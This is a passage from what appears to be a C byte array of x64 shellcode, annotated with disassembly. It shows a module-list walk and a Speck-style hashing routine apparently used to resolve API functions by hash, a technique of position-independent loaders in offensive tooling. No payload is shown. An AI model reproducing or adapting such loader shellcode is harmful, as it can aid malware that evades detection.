  /* 09C9 */ "\xe8\x12\xf7\xff\xff"                     /* call      0xe0                                 */
  /* 09CE */ "\x48\x8b\x1b"                             /* mov       rbx, qword ptr [rbx]                 */
  /* 09D1 */ "\x4c\x8b\xc8"                             /* mov       r9, rax                              */
  /* 09D4 */ "\x48\x8b\x43\x30"                         /* mov       rax, qword ptr [rbx + 0x30]          */
  /* 09D8 */ "\x48\x85\xc0"                             /* test      rax, rax                             */
  /* 09DB */ "\x75\xde"                                 /* jne       0x9bb                                */
  /* 09DD */ "\x48\x8b\x5c\x24\x30"                     /* mov       rbx, qword ptr [rsp + 0x30]          */
  /* 09E2 */ "\x49\x8b\xc1"                             /* mov       rax, r9                              */
  /* 09E5 */ "\x48\x8b\x74\x24\x38"                     /* mov       rsi, qword ptr [rsp + 0x38]          */
  /* 09EA */ "\x48\x83\xc4\x20"                         /* add       rsp, 0x20                            */
  /* 09EE */ "\x5f"                                     /* pop       rdi                                  */
  /* 09EF */ "\xc3"                                     /* ret                                            */
  /* 09F0 */ "\x48\x89\x5c\x24\x08"                     /* mov       qword ptr [rsp + 8], rbx             */
  /* 09F5 */ "\x48\x89\x6c\x24\x10"                     /* mov       qword ptr [rsp + 0x10], rbp          */
  /* 09FA */ "\x48\x89\x74\x24\x18"                     /* mov       qword ptr [rsp + 0x18], rsi          */
  /* 09FF */ "\x57"                                     /* push      rdi                                  */
  /* 0A00 */ "\x41\x56"                                 /* push      r14                                  */
  /* 0A02 */ "\x41\x57"                                 /* push      r15                                  */
  /* 0A04 */ "\x48\x83\xec\x30"                         /* sub       rsp, 0x30                            */
  /* 0A08 */ "\x33\xff"                                 /* xor       edi, edi                             */
  /* 0A0A */ "\x33\xed"                                 /* xor       ebp, ebp                             */
  /* 0A0C */ "\x45\x33\xf6"                             /* xor       r14d, r14d                           */
  /* 0A0F */ "\x48\x8b\xf2"                             /* mov       rsi, rdx                             */
  /* 0A12 */ "\x4c\x8b\xf9"                             /* mov       r15, rcx                             */
  /* 0A15 */ "\x42\x8a\x54\x3d\x00"                     /* mov       dl, byte ptr [rbp + r15]             */
  /* 0A1A */ "\x84\xd2"                                 /* test      dl, dl                               */
  /* 0A1C */ "\x74\x11"                                 /* je        0xa2f                                */
  /* 0A1E */ "\x83\xfd\x40"                             /* cmp       ebp, 0x40                            */
  /* 0A21 */ "\x74\x0c"                                 /* je        0xa2f                                */
  /* 0A23 */ "\x8b\xc7"                                 /* mov       eax, edi                             */
  /* 0A25 */ "\xff\xc7"                                 /* inc       edi                                  */
  /* 0A27 */ "\xff\xc5"                                 /* inc       ebp                                  */
  /* 0A29 */ "\x88\x54\x04\x20"                         /* mov       byte ptr [rsp + rax + 0x20], dl      */
  /* 0A2D */ "\xeb\x56"                                 /* jmp       0xa85                                */
  /* 0A2F */ "\x8b\xc7"                                 /* mov       eax, edi                             */
  /* 0A31 */ "\x48\x8d\x5c\x24\x20"                     /* lea       rbx, qword ptr [rsp + 0x20]          */
  /* 0A36 */ "\x48\x03\xd8"                             /* add       rbx, rax                             */
  /* 0A39 */ "\x41\xb8\x10\x00\x00\x00"                 /* mov       r8d, 0x10                            */
  /* 0A3F */ "\x48\x8b\xcb"                             /* mov       rcx, rbx                             */
  /* 0A42 */ "\x44\x2b\xc7"                             /* sub       r8d, edi                             */
  /* 0A45 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 0A47 */ "\xe8\xec\x00\x00\x00"                     /* call      0xb38                                */
  /* 0A4C */ "\xc6\x03\x80"                             /* mov       byte ptr [rbx], 0x80                 */
  /* 0A4F */ "\x83\xff\x0c"                             /* cmp       edi, 0xc                             */
  /* 0A52 */ "\x72\x20"                                 /* jb        0xa74                                */
  /* 0A54 */ "\x48\x8b\xd6"                             /* mov       rdx, rsi                             */
  /* 0A57 */ "\x48\x8d\x4c\x24\x20"                     /* lea       rcx, qword ptr [rsp + 0x20]          */
  /* 0A5C */ "\xe8\x63\x00\x00\x00"                     /* call      0xac4                                */
  /* 0A61 */ "\x33\xd2"                                 /* xor       edx, edx                             */
  /* 0A63 */ "\x48\x8d\x4c\x24\x20"                     /* lea       rcx, qword ptr [rsp + 0x20]          */
  /* 0A68 */ "\x48\x33\xf0"                             /* xor       rsi, rax                             */
  /* 0A6B */ "\x44\x8d\x42\x10"                         /* lea       r8d, dword ptr [rdx + 0x10]          */
  /* 0A6F */ "\xe8\xc4\x00\x00\x00"                     /* call      0xb38                                */
  /* 0A74 */ "\x8b\xc5"                                 /* mov       eax, ebp                             */
  /* 0A76 */ "\xbf\x10\x00\x00\x00"                     /* mov       edi, 0x10                            */
  /* 0A7B */ "\xc1\xe0\x03"                             /* shl       eax, 3                               */
  /* 0A7E */ "\x89\x44\x24\x2c"                         /* mov       dword ptr [rsp + 0x2c], eax          */
  /* 0A82 */ "\x41\xff\xc6"                             /* inc       r14d                                 */
  /* 0A85 */ "\x83\xff\x10"                             /* cmp       edi, 0x10                            */
  /* 0A88 */ "\x75\x12"                                 /* jne       0xa9c                                */
  /* 0A8A */ "\x48\x8b\xd6"                             /* mov       rdx, rsi                             */
  /* 0A8D */ "\x48\x8d\x4c\x24\x20"                     /* lea       rcx, qword ptr [rsp + 0x20]          */
  /* 0A92 */ "\xe8\x2d\x00\x00\x00"                     /* call      0xac4                                */
  /* 0A97 */ "\x48\x33\xf0"                             /* xor       rsi, rax                             */
  /* 0A9A */ "\x33\xff"                                 /* xor       edi, edi                             */
  /* 0A9C */ "\x45\x85\xf6"                             /* test      r14d, r14d                           */
  /* 0A9F */ "\x0f\x84\x70\xff\xff\xff"                 /* je        0xa15                                */
  /* 0AA5 */ "\x48\x8b\x5c\x24\x50"                     /* mov       rbx, qword ptr [rsp + 0x50]          */
  /* 0AAA */ "\x48\x8b\xc6"                             /* mov       rax, rsi                             */
  /* 0AAD */ "\x48\x8b\x74\x24\x60"                     /* mov       rsi, qword ptr [rsp + 0x60]          */
  /* 0AB2 */ "\x48\x8b\x6c\x24\x58"                     /* mov       rbp, qword ptr [rsp + 0x58]          */
  /* 0AB7 */ "\x48\x83\xc4\x30"                         /* add       rsp, 0x30                            */
  /* 0ABB */ "\x41\x5f"                                 /* pop       r15                                  */
  /* 0ABD */ "\x41\x5e"                                 /* pop       r14                                  */
  /* 0ABF */ "\x5f"                                     /* pop       rdi                                  */
  /* 0AC0 */ "\xc3"                                     /* ret                                            */
  /* 0AC1 */ "\xcc"                                     /* int3                                           */
  /* 0AC2 */ "\xcc"                                     /* int3                                           */
  /* 0AC3 */ "\xcc"                                     /* int3                                           */
  /* 0AC4 */ "\x48\x8b\xc4"                             /* mov       rax, rsp                             */
  /* 0AC7 */ "\x53"                                     /* push      rbx                                  */
  /* 0AC8 */ "\x48\x83\xec\x10"                         /* sub       rsp, 0x10                            */
  /* 0ACC */ "\x0f\x10\x01"                             /* movups    xmm0, xmmword ptr [rcx]              */
  /* 0ACF */ "\x48\x89\x50\x10"                         /* mov       qword ptr [rax + 0x10], rdx          */
  /* 0AD3 */ "\x8b\xca"                                 /* mov       ecx, edx                             */
  /* 0AD5 */ "\x44\x8b\x40\x14"                         /* mov       r8d, dword ptr [rax + 0x14]          */
  /* 0AD9 */ "\x45\x33\xd2"                             /* xor       r10d, r10d                           */
  /* 0ADC */ "\x0f\x11\x04\x24"                         /* movups    xmmword ptr [rsp], xmm0              */
  /* 0AE0 */ "\x8b\x50\xf4"                             /* mov       edx, dword ptr [rax - 0xc]           */
  /* 0AE3 */ "\x44\x8b\x58\xf0"                         /* mov       r11d, dword ptr [rax - 0x10]         */
  /* 0AE7 */ "\x8b\x58\xec"                             /* mov       ebx, dword ptr [rax - 0x14]          */
  /* 0AEA */ "\x44\x8b\x0c\x24"                         /* mov       r9d, dword ptr [rsp]                 */
  /* 0AEE */ "\x8b\xc2"                                 /* mov       eax, edx                             */
  /* 0AF0 */ "\xc1\xc9\x08"                             /* ror       ecx, 8                               */
  /* 0AF3 */ "\x41\x03\xc8"                             /* add       ecx, r8d                             */
  /* 0AF6 */ "\x8b\xd3"                                 /* mov       edx, ebx                             */
  /* 0AF8 */ "\x41\x33\xc9"                             /* xor       ecx, r9d                             */
  /* 0AFB */ "\xc1\xca\x08"                             /* ror       edx, 8                               */
  /* 0AFE */ "\x41\x03\xd1"                             /* add       edx, r9d                             */
  /* 0B01 */ "\x41\xc1\xc0\x03"                         /* rol       r8d, 3                               */
  /* 0B05 */ "\x41\x33\xd2"                             /* xor       edx, r10d                            */
  /* 0B08 */ "\x41\xc1\xc1\x03"                         /* rol       r9d, 3                               */
  /* 0B0C */ "\x44\x33\xca"                             /* xor       r9d, edx                             */
  /* 0B0F */ "\x44\x33\xc1"                             /* xor       r8d, ecx                             */
  /* 0B12 */ "\x41\xff\xc2"                             /* inc       r10d                                 */
  /* 0B15 */ "\x41\x8b\xdb"                             /* mov       ebx, r11d                            */
  /* 0B18 */ "\x44\x8b\xd8"                             /* mov       r11d, eax                            */
  /* 0B1B */ "\x41\x83\xfa\x1b"                         /* cmp       r10d, 0x1b                           */
  /* 0B1F */ "\x72\xcd"                                 /* jb        0xaee                                */
  /* 0B21 */ "\x89\x4c\x24\x28"                         /* mov       dword ptr [rsp + 0x28], ecx          */
  /* 0B25 */ "\x44\x89\x44\x24\x2c"                     /* mov       dword ptr [rsp + 0x2c], r8d          */
  /* 0B2A */ "\x48\x8b\x44\x24\x28"                     /* mov       rax, qword ptr [rsp + 0x28]          */
  /* 0B2F */ "\x48\x83\xc4\x10"                         /* add       rsp, 0x10                            */
  /* 0B33 */ "\x5b"                                     /* pop       rbx                                  */
  /* 0B34 */ "\xc3"                                     /* ret                                            */
  /* 0B35 */ "\xcc"                                     /* int3                                           */
  /* 0B36 */ "\xcc"                                     /* int3                                           */
  /* 0B37 */ "\xcc"                                     /* int3                                           */
  /* 0B38 */ "\x48\x89\x7c\x24\x08"                     /* mov       qword ptr [rsp + 8], rdi             */
  /* 0B3D */ "\x4c\x8b\xc9"                             /* mov       r9, rcx                              */
  /* 0B40 */ "\x8a\xc2"                                 /* mov       al, dl                               */
  /* 0B42 */ "\x49\x8b\xf9"                             /* mov       rdi, r9                              */
  /* 0B45 */ "\x49\x63\xc8"                             /* movsxd    rcx, r8d                             */
  /* 0B48 */ "\xf3\xaa"                                 /* rep stosb byte ptr [rdi], al                   */
  /* 0B4A */ "\x48\x8b\x7c\x24\x08"                     /* mov       rdi, qword ptr [rsp + 8]             */
  /* 0B4F */ "\x49\x8b\xc1"                             /* mov       rax, r9                              */
  /* 0B52 */ "\xc3"                                     /* ret                                            */
};